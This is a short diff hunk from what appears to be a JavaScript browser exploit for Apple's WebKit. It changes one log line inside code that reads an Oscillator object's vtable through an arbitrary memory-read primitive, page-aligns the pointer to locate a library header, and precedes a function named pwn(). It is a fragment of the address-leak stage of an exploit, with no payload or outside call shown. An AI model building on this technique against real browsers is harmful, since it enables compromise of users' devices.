@@ -643,7 +643,7 @@ var VM_PROT_EXECUTE = 0x4
         log('[+] Oscillator vtable seems to be at '+v_tlb.toString(16));
         var anchor = memory.read_i64(v_tlb)
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
-        log('dyld cache header @' + hdr); //dyld_cache_header
+        log('Webcore header @' + hdr); //dyld_cache_header
               
           }
           function pwn() {
